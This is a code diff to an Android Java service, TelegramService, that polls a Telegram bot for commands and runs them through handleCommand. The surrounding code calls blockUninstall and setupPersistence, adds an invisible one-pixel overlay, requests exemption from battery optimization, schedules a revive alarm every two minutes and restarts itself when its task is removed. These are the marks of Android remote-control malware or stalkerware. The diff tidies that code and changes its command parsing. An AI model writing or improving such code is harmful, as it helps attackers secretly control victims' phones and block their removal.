@@ -106,33 +106,20 @@ public class TelegramService extends Service {
         
         blockUninstall();
         setupPersistence();
-        
-        // MIUI PROTECTION
         startOverlay();
         requestIgnoreBatteryOptimization();
     }
 
     private void startOverlay() {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                return;
-            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return;
             WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
             overlayView = new View(this);
-            
-            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O 
-                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY 
-                    : WindowManager.LayoutParams.TYPE_PHONE;
-            
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    1, 1, type,
+            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1, type,
                     WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-                    PixelFormat.TRANSLUCENT
-            );
+                    PixelFormat.TRANSLUCENT);
             params.gravity = Gravity.TOP | Gravity.START;
-            params.x = 0;
-            params.y = 0;
-            
             wm.addView(overlayView, params);
         } catch (Exception e) {}
     }
@@ -156,9 +143,8 @@ public class TelegramService extends Service {
             AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
             Intent intent = new Intent(this, ReviveReceiver.class);
             PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi); // 2 MINS
+                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
             } else {
                 am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 120000, pi);
             }
@@ -191,7 +177,8 @@ public class TelegramService extends Service {
                         JSONObject update = result.getJSONObject(i);
                         lastUpdateId = update.getLong("update_id");
                         if (update.has("message")) {
-                            String text = update.getJSONObject("message").optString("text", "");
+                            String text = update.getJSONObject("message").optString("text", "").trim();
+                            if (text.contains("@")) text = text.split("@")[0];
                             handleCommand(text);
                         }
                     }
@@ -712,4 +699,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-                                                                                     }
+}
